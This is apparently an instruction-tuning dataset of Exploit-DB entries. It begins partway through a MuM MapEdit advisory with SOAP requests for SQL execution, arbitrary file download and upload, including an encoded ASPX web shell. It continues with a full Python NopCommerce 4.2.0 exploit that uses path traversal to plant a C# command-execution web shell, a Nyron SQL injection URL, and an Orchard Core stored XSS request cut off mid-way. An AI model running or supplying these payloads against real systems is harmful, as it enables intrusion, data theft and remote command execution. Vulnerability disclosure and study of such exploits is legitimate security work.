xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\">\n                                               <b:Columns/>\n                                               <b:SRID>0</b:SRID>\n                                   </queryDefinition>\n                                   <parameterNames xmlns:b=\"http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"/>\n                                   <parameterValues xmlns:b=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"/>\n                                   <startRow>1</startRow>\n                                   <bufferSize>2000</bufferSize>\n                                   <limit>0</limit>\n                        </QueryData>\n            </s:Body>\n</s:Envelope>\n\nThe node \"Filename\" can be used to access different SQLite databases on the system, while the node\n\"sql\" contains the SQL-query to be executed on the system.\nResponses to this request are encoded in NBFS as well and can be decoded to the following XML data:\n\nResponse:\n---------\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://www.w3.org/2005/08/addressing\">\n            <s:Header>\n                        <a:Action s:mustUnderstand=\"1\">urn:DataAccessService/QueryDataResponse</a:Action>\n                        <a:RelatesTo>urn:uuid:b086a157-1bce-41be-b25c-492ab4f6dfa3</a:RelatesTo>\n            </s:Header>\n            <s:Body>\n                        <QueryDataResponse>\n                                   <QueryDataResult xmlns:b=\"http://schemas.datacontract.org/2004/07/Mum.Geo.Core\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\">\n                                               <b:Parameter xmlns:c=\"http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess\">\n                                                           <c:Data>eNpjZAACZncXTwihYm6SlpiUammsa2hpaKlrkmhsrpuYamSpa2RkbGxpkZpsYZCSDAD4Jgsj</c:Data>\n                                                           <c:FetchedAllRows>true</c:FetchedAllRows>\n                                                           <c:ResultColumns>\n                                                                       <c:DbColumnDefinition>\n                                                                                  <c:Caption>NAME</c:Caption>\n                                                                                  <c:DataType>DbString</c:DataType>\n                                                                                  <c:DefaultValue/>\n                                                                                  <c:IsNullable>false</c:IsNullable>\n                                                                                  <c:IsPrimaryKey>false</c:IsPrimaryKey>\n                                                                                  <c:Length>255</c:Length>\n                                                                                  <c:Name>NAME</c:Name>\n                                                                                  <c:Precision>0</c:Precision>\n                                                                                  <c:Scale>0</c:Scale>\n                                                                       </c:DbColumnDefinition>\n                                                                       <c:DbColumnDefinition>\n                                                                                  <c:Caption>CAPTION</c:Caption>\n                                                                                  <c:DataType>DbString</c:DataType>\n                                                                                  <c:DefaultValue/>\n                                                                                  <c:IsNullable>false</c:IsNullable>\n                                                                                  <c:IsPrimaryKey>false</c:IsPrimaryKey>\n                                                                                  <c:Length>255</c:Length>\n                                                                                  <c:Name>CAPTION</c:Name>\n                                                                                  <c:Precision>0</c:Precision>\n                                                                                  <c:Scale>0</c:Scale>\n                                                                       </c:DbColumnDefinition>\n                                                                       <c:DbColumnDefinition>\n                                                                                  <c:Caption>VERSION_SYSTEMDATA</c:Caption>\n                                                                                  <c:DataType>DbString</c:DataType>\n                                                                                  <c:DefaultValue/>\n                                                                                  <c:IsNullable>true</c:IsNullable>\n                                                                                  <c:IsPrimaryKey>false</c:IsPrimaryKey>\n                                                                                  <c:Length>40</c:Length>\n                                                                                  <c:Name>VERSION_SYSTEMDATA</c:Name>\n                                                                                  <c:Precision>0</c:Precision>\n                                                                                  <c:Scale>0</c:Scale>\n                                                                       </c:DbColumnDefinition>\n                                                           </c:ResultColumns>\n                                               </b:Parameter>\n                                               <b:State>\n                                                           <b:Tags>\n                                                                       <b:Item i:nil=\"true\"/>\n                                                           </b:Tags>\n                                                           <b:ExceptionMessage/>\n                                                           <b:StackTrace/>\n                                                           <b:Succeeded>true</b:Succeeded>\n                                               </b:State>\n                                   </QueryDataResult>\n                        </QueryDataResponse>\n            </s:Body>\n</s:Envelope>\n\nThe nodes \"DbColumnDefinition\" contain the definition of the returned columns, the node \"Data\"\ncontains the result of the SQL-query as an Base64-encoded zlib-compressed data:\n\n            GDI|GDI|74fabe93-1919-4a37-ae29-223398ec80dc\n\nThe same result can be produced, when the database is locally read:\n\n            >sqlite3 System.db\n\n            sqlite> select name, caption, version_systemdata from project where id\n                        in (select Project_id      from usergroup_project where usergroup_id\n                                   in (select usergroup_id from user_usergroup where user_id\n                                               in (select id from user where name='TEST'))) order by caption;\n\n            GDI|GDI|74fabe93-1919-4a37-ae29-223398ec80dc\n\n\n## Arbitrary file manipulation\nBy sending POST requests to the URL /Mum.Geo.Services/IO.svc an authenticated user is able to\nperform several actions.\nMost interesting, from an attacker's point of view, would be the following:\n            - \"GetFileName\", which lists files in a given folder\n            - \"DownloadFile\", which enables the user to download any file the web server has read-access to\n            - \"UploadFile\", which allows to upload files to folders the web server has write-access to\n\nThe different activities are documented in the subsections below.\nAs well as in the SQL execution section, the request and response content is decoded from NBFS for\nbetter readability.\n\n### File exploration\nAn authenticated user is able to list all files in a given folder by sending the following content\nto the IO Service.\n\nRequest:\n--------\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://www.w3.org/2005/08/addressing\">\n            <s:Header>\n                        <a:Action s:mustUnderstand=\"1\">urn:IO/GetFileNames</a:Action>\n                        <a:MessageID>urn:uuid:037dee48-520a-46ae-a47b-b9b57a901676</a:MessageID>\n                        <a:SequenceAcknowledgement>\n                                   <a:ReplyTo>http://www.w3.org/2005/08/addressing/anonymous</a:ReplyTo>\n                        </a:SequenceAcknowledgement>\n                        <a:To s:mustUnderstand=\"1\">http://[host]/Mum.Geo.Services/IO.svc</a:To>\n            </s:Header>\n            <s:Body>\n                        <GetFileNames>\n                                   <path>[path_to_webroot]</path>\n                                   <searchPattern>*.*</searchPattern>\n                                   <recursive>false</recursive>\n                        </GetFileNames>\n            </s:Body>\n</s:Envelope>\n\nResponse:\n---------\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://www.w3.org/2005/08/addressing\">\n            <s:Header>\n                        <a:Action s:mustUnderstand=\"1\">urn:IO/GetFileNamesResponse</a:Action>\n                        <a:RelatesTo>urn:uuid:037dee48-520a-46ae-a47b-b9b57a901676</a:RelatesTo>\n            </s:Header>\n            <s:Body>\n                        <GetFileNamesResponse>\n                                   <GetFileNamesResult xmlns:b=\"http://schemas.datacontract.org/2004/07/Mum.Geo.Core\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\">\n                                               <b:Parameter xmlns:c=\"http://schemas.datacontract.org/2004/07/Mum.Geo.IO\">\n                                                           <c:FileNames xmlns:d=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\n                                                                       <d:string>clientaccesspolicy.xml</d:string>\n                                                                       <d:string>crossdomain.xml</d:string>\n                                                                       <d:string>iisstart.htm</d:string>\n                                                                       <d:string>index.html</d:string>\n                                                                       <d:string>index.php</d:string>\n                                                                       <d:string>Thumbs.db</d:string>\n                                                                       <d:string>web.config</d:string>\n                                                                       <d:string>welcome.png</d:string>\n                                                           </c:FileNames>\n                                                           <c:Path>[path_to_webroot]</c:Path>\n                                               </b:Parameter>\n                                               <b:State>\n                                                           <b:Tags>\n                                                                       <b:Item i:nil=\"true\"/>\n                                                           </b:Tags>\n                                                           <b:ExceptionMessage/>\n                                                           <b:StackTrace/>\n                                                           <b:Succeeded>true</b:Succeeded>\n                                               </b:State>\n                                   </GetFileNamesResult>\n                        </GetFileNamesResponse>\n            </s:Body>\n</s:Envelope>\n\n### Download of arbitrary files\nThe same web service can be abused to download any file, that the web server user has read-access to.\n\nRequest:\n--------\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://www.w3.org/2005/08/addressing\">\n            <s:Header>\n                        <a:Action s:mustUnderstand=\"1\">urn:IO/DownloadFile</a:Action>\n                        <a:MessageID>urn:uuid:48428e6d-19b5-42e2-ad6c-6bfde4849504</a:MessageID>\n                        <a:SequenceAcknowledgement>\n                                   <a:ReplyTo>http://www.w3.org/2005/08/addressing/anonymous</a:ReplyTo>\n                        </a:SequenceAcknowledgement>\n                        <a:To s:mustUnderstand=\"1\">http://[host]/Mum.Geo.Services/IO.svc</a:To>\n            </s:Header>\n            <s:Body>\n                        <DownloadFile>\n                                   <filename>[path_to_webroot]\\Mum.Geo.Services\\Admin.html</filename>\n                        </DownloadFile>\n            </s:Body>\n</s:Envelope>\n\nResponse:\n---------\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://www.w3.org/2005/08/addressing\">\n            <s:Header>\n                        <a:Action s:mustUnderstand=\"1\">urn:IO/DownloadFileResponse</a:Action>\n                        <a:RelatesTo>urn:uuid:48428e6d-19b5-42e2-ad6c-6bfde4849504</a:RelatesTo>\n            </s:Header>\n            <s:Body>\n                        <DownloadFileResponse>\n                                   <DownloadFileResult xmlns:b=\"http://schemas.datacontract.org/2004/07/Mum.Geo.Server.Core.IO\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\">\n                                               <b:Data>77u/PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPg0KPGhlYWQ+DQogICAgPHRpdGxlPkFkbWluPC90aXRsZT4NCiAgICA8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwOyBVUkw9U3RhcnQuYXNweD9BZG1pbk1vZGU9dHJ1ZSIvPg0KPC9oZWFkPg0KPGJvZHk+DQogIDxwPjxhIGhyZWY9IlN0YXJ0LmFzcHg/QWRtaW5Nb2RlPXRydWUiPlN0YXJ0IE11bSBBZG1pbmlzdHJhdG9yPC9hPjwvcD4gDQo8L2JvZHk+DQo8L2h0bWw+DQo=</b:Data>\n                                               <b:FileNotFound>false</b:FileNotFound>\n                                               <b:IsComplete>true</b:IsComplete>\n                                   </DownloadFileResult>\n                        </DownloadFileResponse>\n            </s:Body>\n</s:Envelope>\n\nThe node \"Data\" itself can be base64-decoded, to receive the file contents:\n\n            \u00ef\u00bb\u00bf<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n            \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n            <html xmlns=\"http://www.w3.org/1999/xhtml\">\n            <head>\n                        <title>Admin</title>\n                        <meta http-equiv=\"refresh\" content=\"0; URL=Start.aspx?AdminMode=true\"/>\n            </head>\n            <body>\n              <p><a href=\"Start.aspx?AdminMode=true\">Start Mum Administrator</a></p>\n            </body>\n            </html>\n\n\n### Upload of arbitrary files\nThe web service can be abused to upload a file to any folder, that the web server user has\nwrite-access to.\n\nRequest:\n--------\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://www.w3.org/2005/08/addressing\">\n            <s:Header>\n                        <a:Action s:mustUnderstand=\"1\">urn:IO/UploadFile</a:Action>\n                        <a:MessageID>urn:uuid:20cca52e-da4c-4981-a433-eb596411d89a</a:MessageID>\n                        <a:SequenceAcknowledgement>\n                                   <a:ReplyTo>http://www.w3.org/2005/08/addressing/anonymous</a:ReplyTo>\n                        </a:SequenceAcknowledgement>\n                        <a:To s:mustUnderstand=\"1\">http://[host]/Mum.Geo.Services/IO.svc</a:To>\n            </s:Header>\n            <s:Body>\n                        <UploadFile>\n                                   <clientFilename/>\n                                   <serverFilename>[path_to_webroot]\\MumGeoData\\Userdata\\GDI\\isec.aspx</serverFilename>\n                                   <temporaryServerFilename>[path_to_MumGeoData]\\Userdata\\GDI\\e41279bd-343d-48a1-a413-05e1b3c50f40\\Bookmarks\\Bookmarks.sod.tmp636008925231332626</temporaryServerFilename>\n                                    <data>eJyFk21P2zAQx9/nU5w8IbXalj4A29Qk1aANolJHK5qJaW+QkxwhW2JHtgNBE99956TdWEHsleN7/Pl/F//gM6x5hrDkIqvpI2CzNwzmGNdZwIyqkUGkeEL2G15ouh1MHZ+SFmUllYELXqKuWv/mQRss3XnOMyG1yRP9/+DFqovRicor8wQiIQhVC24CplHdoWJT507maQt7vZQ87cn4ByYGNIoU1TsI71CYE5VpwL7zy3l0tFG5yCBsktrgrEx7WwNXmQ1YK5mg1hvDlVmIGwmVziEAgfew7+r1PYe87lleoH0DhbGkTF1skHUe6luX1F9b1yAB9pa6dK5LTHNFoFRNpFylq9pUtaE4K24X8lXj5haLImzQspKv1drbMUJFpu2321L1KI2gNkYhLy+RkwKgTalSRZGV+28vbyeFpeuiXJsTyVCk9m1b26yQGu1doamVAO2Riq3o9Fhiu54VefJzX/ftJPfkv6RBS6HRvVK5wR7zK4VTRrX3HJt2uO65KYtQJDLF3t95mcYWdCNsTL//PJX5g13RR8cfdCtEu3QefVnaIzyZ02FyU+CU36MAritXoIF7jLWV2x90TkreBscyfQA6b6QqIU8DO2UGJZpbSZeKtvr5VvpUdmIZT2XT5nTYjJR+KGiTv79fXMzDbxMYDUceLMOzaAJHw+Oq8WC92iyixepiAjzWsqBnexCt1hMYD6tmvxNc5am5Ddj42Dqn/uBJ3y3FaW2MFB0E0h8oXqQY7yg+fHydYvTpBQrbMWDYDonBSrQ70Qr1Z0N2cB3Olm3JYyxatCIubJGX0A53aIej4esCjZ+jTWeyLGnvJ133tqGdrR2mPe1w21m3+/EbI5Kikw==</data>\n                                   <append>false</append>\n                                   <completed>true</completed>\n                        </UploadFile>\n            </s:Body>\n</s:Envelope>\n\nThe \"data\" node contains a base64-encoded, zlib-packed aspx web shell. It can be used to issue\narbitrary commands on the compromised host.\n\nResponse:\n---------\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://www.w3.org/2005/08/addressing\">\n            <s:Header>\n                        <a:Action s:mustUnderstand=\"1\">urn:IO/UploadFileResponse</a:Action>\n                        <a:RelatesTo>urn:uuid:20cca52e-da4c-4981-a433-eb596411d89a</a:RelatesTo>\n            </s:Header>\n            <s:Body>\n                        <UploadFileResponse>\n                                   <UploadFileResult xmlns:b=\"http://schemas.datacontract.org/2004/07/Mum.Geo.Core\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\">\n                                               <b:Parameter/>\n                                               <b:State>\n                                                           <b:Tags>\n                                                                       <b:Item i:nil=\"true\"/>\n                                                           </b:Tags>\n                                                           <b:ExceptionMessage/>\n                                                           <b:StackTrace/>\n                                                           <b:Succeeded>true</b:Succeeded>\n                                               </b:State>\n                                   </UploadFileResult>\n                        </UploadFileResponse>\n            </s:Body>\n</s:Envelope>\n\n\n## Base64 encoded Passwords\nIn the database file in \\MumGeoData\\System\\System.db Passwords are stored in the tables \"user\" and\n\"connection\". Both tables store their passwords in plain text with base64 encoding applied.\n\nExample:\nsqlite> select * from user where name='MUM';\n<User GUID>|MUM|<base64 encoded password>|1||\n\n\n## Remark about information disclosures\nObserving the communication between a MapEdit Silverlight client and its backend server, various\ninformation could be gathered, particularly file paths and license keys. Additionally the error\nmessages, that the server generates discloses quite a lot of information about the backend parsing\nprocess.\n\n\n## History\n\n2016-06-07        Discovery of mentioned vulnerabilities\n2016-06-09        First contact with MuM\n2016-06-23        confirmation of mentioned vulnerabilities\n2016-07-29        Release of version 6.2.74\n2016-09-13        Public disclosure"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47783",
        "output": {
            "ID": "47783",
            "File": "exploits/aspx/webapps/47783.py",
            "Description": "NopCommerce 4.2.0 - Privilege Escalation",
            "Date Published": "2019-12-17",
            "Author": "Alessandro Magnosi",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-12-17",
            "Date Updated": "2019-12-17",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Vulnerability Title: NopCommerce 4.2.0 -  Privilege Escalation\n# Author: Alessandro Magnosi (d3adc0de)\n# Date: 2019-07-07\n# Vendor Homepage: https://www.nopcommerce.com/\n# Software Link : https://www.nopcommerce.com/\n# Tested Version: 4.2.0\n# Vulnerability Type: Privilege Escalation\n# Tested on OS: Windows 10, CentOS, Docker\n# Exploit designed for: NopCommerce 4.2.0 on IIS\n\nimport requests\nimport argparse\nfrom bs4 import BeautifulSoup\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nimport warnings\nwarnings.filterwarnings(\"ignore\", category=UserWarning, module='bs4')\n\ndef proxy(flag):\n    return {\"http\" : \"http://127.0.0.1:9090\", \"https\" : \"http://127.0.0.1:9090\"} if flag else None\n\ndef geturl(baseurl, type):\n    if type == \"login\":\n        return baseurl + \"/login\"\n    elif type == \"mv\":\n        return baseurl + \"/Admin/RoxyFileman/ProcessRequest?a=RENAMEDIR&d=%2fimages%2fuploaded%2f..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2fCommon%2f&n=Common2\"\n    elif type == \"mkdir\":\n        return baseurl + \"/Admin/RoxyFileman/ProcessRequest?a=CREATEDIR&d=%2fimages%2fuploaded%2f..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2f&n=Common\"\n    elif type == \"put\":\n        return baseurl + \"/Admin/RoxyFileman/ProcessRequest?a=UPLOAD\"\n    elif type == \"contactus\":\n        return baseurl + \"/contactus\"\n    else:\n        return \"\"\n\ndef login(email, password, url, proxy):\n    res = requests.get(geturl(url, \"login\"), proxies=proxy, verify=False, allow_redirects=False)\n    cookie = res.cookies.get_dict()\n    soup = BeautifulSoup(res.text, features=\"html.parser\")\n    token = soup.find(\"input\", {\"name\":\"__RequestVerificationToken\"})[\"value\"]\n    res = requests.post(geturl(url, \"login\"), cookies=cookie, data={\"Email\":email, \"Password\":password, \"__RequestVerificationToken\":token, \"RememberMe\":\"false\"}, proxies=proxy, verify=False, allow_redirects=False)\n    cookies = res.cookies.get_dict()\n    return { **cookies, **cookie }\n\ndef shellupload(email, password, url, proxy):\n    print(\"[+] Trying uploading shell from\")\n    cookies = login(email, password, url, proxy)\n    # Rename Common Directory\n    requests.get(geturl(url, \"mv\"), headers={\"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\"}, proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)\n    # Create Common Directory\n    requests.get(geturl(url, \"mkdir\"), headers={\"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\"}, proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)\n    # Upload File into Common\n    requests.post(geturl(url, \"put\"), headers={\"Content-Type\" : \"multipart/form-data; boundary=---------------------------3125261928760\" ,\"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\"}, data=\"-----------------------------3125261928760\\r\\nContent-Disposition: form-data; name=\\\"action\\\"\\r\\n\\r\\nupload\\r\\n-----------------------------3125261928760\\r\\nContent-Disposition: form-data; name=\\\"method\\\"\\r\\n\\r\\najax\\r\\n-----------------------------3125261928760\\r\\nContent-Disposition: form-data; name=\\\"d\\\"\\r\\n\\r\\n/images/uploaded/../../../../../../../../../../inetpub/wwwroot/nopcommerce/Views/Common/\\r\\n-----------------------------3125261928760\\r\\nContent-Disposition: form-data; name=\\\"files[]\\\"; filename=\\\"ContactUs.cshtml\\\"\\r\\nContent-Type: image/png\\r\\n\\r\\n@using System\\r\\n@using System.Diagnostics\\r\\n\\r\\n@{ \\r\\n    ViewData[\\\"Title\\\"] = \\\"MVC Sh3ll Windows\\\";\\r\\n    var result = \\\"\\\";\\r\\n    var cmd = Context.Request.Query[\\\"cmd\\\"];\\r\\n    if (!String.IsNullOrEmpty(cmd)){\\r\\n        result = Bash(cmd);\\r\\n    }\\r\\n\\r\\n    if (String.IsNullOrEmpty(result)){\\r\\n        result = \\\"Invalid command or something didn't work\\\";\\r\\n    }\\r\\n\\r\\n}\\r\\n\\r\\n@functions{\\r\\n    public static string Bash (string cmd)\\r\\n    {\\r\\n        var result = \\\"\\\";\\r\\n        var escapedArgs = cmd.Replace(\\\"\\\\\\\"\\\", \\\"\\\\\\\\\\\\\\\"\\\");\\r\\n        var process = new Process()\\r\\n        {\\r\\n            StartInfo = new ProcessStartInfo\\r\\n            {\\r\\n                FileName = \\\"cmd.exe\\\",\\r\\n                Arguments = $\\\"/C \\\\\\\"{escapedArgs}\\\\\\\"\\\",\\r\\n                RedirectStandardOutput = true,\\r\\n                UseShellExecute = false,\\r\\n                CreateNoWindow = true,\\r\\n            }\\r\\n        };\\r\\n\\r\\n        process.Start();\\r\\n        result = process.StandardOutput.ReadToEnd();\\r\\n        process.WaitForExit();\\r\\n\\r\\n        return result;\\r\\n    }\\r\\n}\\r\\n\\r\\n\\r\\n\\r\\n<script\\r\\n  src=\\\"https://code.jquery.com/jquery-3.2.1.min.js\\\"\\r\\n  integrity=\\\"sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=\\\"\\r\\n  crossorigin=\\\"anonymous\\\"></script>\\r\\n<script>\\r\\n$(function() {\\r\\n    var cmdResult = $(\\\"#cmdResult\\\");\\r\\n\\r\\n\\tconsole.log(cmdResult);\\r\\n\\r\\n\\tif (cmdResult.text() === \\\"Invalid command or something didn't work\\\"){\\r\\n\\t    console.log(\\\"should change text\\\");\\r\\n        cmdResult.css(\\\"color\\\", \\\"red\\\");\\r\\n\\t}\\r\\n\\t\\r\\n\\tvar term = $(\\\"#console\\\");\\r\\n    $(\\\"#cmd\\\").focus();\\r\\n\\tterm.scrollTop(term.prop(\\\"scrollHeight\\\"));\\r\\n\\t\\r\\n\\t$.urlParam = function(name){\\r\\n        var results = new RegExp('[\\\\?&]' + name + '=([^&#]*)').exec(window.location.href);\\r\\n        if (results==null){\\r\\n           return null;\\r\\n        }\\r\\n        else{\\r\\n           return decodeURI(results[1]) || 0;\\r\\n        }\\r\\n    }\\r\\n\\r\\n\\t\\r\\n\\tfunction executeCmd(){\\r\\n        var cmd = encodeURIComponent($(\\\"#cmd\\\").val());\\r\\n\\t    var currentCmd = $.urlParam('cmd');\\r\\n\\t    console.log(\\\"should replace: \\\" + currentCmd + \\\" WITH: \\\" + cmd);\\r\\n\\r\\n\\t    var currentUrl = location.href;\\r\\n\\r\\n\\t    var paramDelimeter = \\\"\\\";\\r\\n\\t    if (currentUrl.indexOf(\\\"?\\\") < 0){\\r\\n\\t        paramDelimeter = \\\"?\\\";\\r\\n\\t    } else {\\r\\n\\t        paramDelimeter = \\\"&\\\";\\r\\n\\t    }\\r\\n        \\r\\n\\t    if (currentUrl.indexOf(\\\"cmd=\\\") < 0){\\r\\n            currentUrl = location.href + paramDelimeter + \\\"cmd=\\\";\\r\\n\\t    }\\r\\n\\t\\r\\n        var newUrl = currentUrl.replace(/cmd=.*/, \\\"cmd=\\\"+cmd);\\r\\n        window.location.href = newUrl;\\r\\n\\r\\n\\t    //console.log(newUrl);\\r\\n\\t}\\r\\n\\t\\r\\n    $(\\\"#submitCommand\\\").click(function(){\\r\\n\\t    executeCmd();\\r\\n\\t})\\r\\n\\r\\n\\t$(\\\"#cmd\\\").keypress(function (e) {\\r\\n\\t    if (e.which == 13) {\\r\\n\\t        executeCmd();\\r\\n\\t        return false;\\r\\n\\t    }\\r\\n\\t});\\r\\n\\r\\n\\t$(\\\"#cmd\\\").on(\\\"change paste keyup\\\", function(theVal){\\r\\n\\t    var cmd = $(\\\"#cmd\\\").val();\\r\\n\\t    $(\\\"#cmdInput\\\").text(cmd);\\r\\n\\t});\\r\\n});\\r\\n\\r\\n</script>\\r\\n\\r\\n\\r\\n<h3>@ViewData[\\\"Title\\\"].</h3>\\r\\n<h4>@ViewData[\\\"Message\\\"]</h4>\\r\\n<h4>Output for:> <span style=\\\"font-family: monospace; font-weight: normal;\\\">@cmd</span></h4>\\r\\n\\r\\n\\r\\n<pre id=\\\"console\\\" style=\\\"color: #00ff00;background-color: #141414;max-height: 606px;\\\">\\r\\nC#:>@cmd\\r\\n\\t\\r\\n<span id=\\\"cmdResult\\\">@result</span>\\r\\n\\t\\r\\nC#:><span id=\\\"cmdInput\\\"></span>\\r\\n</pre>\\r\\n\\r\\n<br />\\r\\n\\r\\n<p>Enter your command below:</p>\\r\\n<span style=\\\"display: inline-flex !important;\\\">\\r\\n    <input  id=\\\"cmd\\\" class=\\\"form-control\\\" type=\\\"text\\\" style=\\\"width: 400px;\\\" /> \\r\\n\\t<button id=\\\"submitCommand\\\" class=\\\"btn btn-primary\\\">Send!</button>\\r\\n</span>\\r\\n\\r\\n-----------------------------3125261928760--\", proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)\n    # Test if it is working\n    res = requests.get(geturl(url, \"contactus\"), headers={\"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\"}, proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)\n    soup = BeautifulSoup(res.text, features=\"html.parser\")\n    test = soup.find(\"span\", {\"id\" : \"cmdResult\"})\n    if test is None:\n        print(\"[-] Maybe the target is not vulnerable, or you need to restart the appliance\")\n    else:\n        print(\"[+] Shell uploaded under contact us page\")\n\ndef main():\n    parser = argparse.ArgumentParser(description='Upload a shell in NopCommerce')\n    parser.add_argument(\n        '-e', '--email', required=True, type=str, help='Username')\n    parser.add_argument(\n        '-p', '--password', required=True, type=str, help='Password')\n    parser.add_argument(\n        '-u', '--url', required=True, type=str, help='Base Url of NopCommerce')\n    parser.add_argument(\n        '-x', '--proxy', required=False, action=\"store_true\", help='Proxy (for debugging)')\n\n    args = parser.parse_args()\n\n    shellupload(args.email, args.password, args.url, proxy(args.proxy))\n\nif __name__ == '__main__':\n    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n    main()"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 50674",
        "output": {
            "ID": "50674",
            "File": "exploits/aspx/webapps/50674.txt",
            "Description": "Nyron 1.0 - SQLi (Unauthenticated)",
            "Date Published": "2022-01-18",
            "Author": "Miguel Santareno",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2022-01-18",
            "Date Updated": "2022-01-18",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Nyron 1.0 - SQLi (Unauthenticated)\n# Google Dork: inurl:\"winlib.aspx\"\n# Date: 01/18/2021\n# Exploit Author: Miguel Santareno\n# Vendor Homepage: http://www.wecul.pt/\n# Software Link: http://www.wecul.pt/solucoes/bibliotecas/\n# Version: < 1.0\n# Tested on: windows\n\n# 1. Description\n\nUnauthenticated user can exploit SQL Injection vulnerability in thes1 parameter.\n\n\n# 2. Proof of Concept (PoC)\n\nhttps://vulnerable_webiste.com/Nyron/Library/Catalog/winlibsrch.aspx?skey=C8AF11631DCA40ADA6DE4C2E323B9989&pag=1&tpp=12&sort=4&cap=&pesq=5&thes1='\">\n\n\n# 3. Research:\nhttps://miguelsantareno.github.io/edp.pdf"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48456",
        "output": {
            "ID": "48456",
            "File": "exploits/aspx/webapps/48456.txt",
            "Description": "Orchard Core RC1 - Persistent Cross-Site Scripting",
            "Date Published": "2020-05-12",
            "Author": "SunCSR",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2020-05-12",
            "Date Updated": "2020-05-12",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Orchard Core RC1 - Persistent Cross-Site Scripting\n# Google Dork: \"Orchardcms\"\n# Date: 2020-05-07\n# Exploit Author: SunCSR (Sun* Cyber Security Research)\n# Vendor Homepage: http://www.orchardcore.net/\n# Software Link: https://github.com/OrchardCMS/OrchardCore\n# Version: RC1\n# Tested on: Windows\n# CVE : N/A\n\n### Vulnerability : Persistent Cross-Site Scripting\n\n###Describe the bug\nPersistent Cross-site scripting (Stored XSS) vulnerabilities in Orchard CMS - Orchard Core RC1 allow remote attackers to inject arbitrary web script or HTML\nvia create or edit blog content.\n\n###To Reproduce\nSteps to reproduce the behavior:\nPOST /Admin/Contents/ContentTypes/BlogPost/Create HTTP/1.1\n-----------------------------31063090348194141451329743365\nContent-Disposition: form-data; name=\"ListPart.ContainerId\"\n\n4s5x3fv3qpsh7rwzvy069ykbxn\n-----------------------------31063090348194141451329743365\nContent-Disposition: form-data; name=\"TitlePart.Title\"\n\nTest XSS\n-----------------------------31063090348194141451329743365\nContent-Disposition: form-data; name=\"AutoroutePart.Path\"\n\n\n-----------------------------31063090348194141451329743365\nContent-Disposition: form-data; 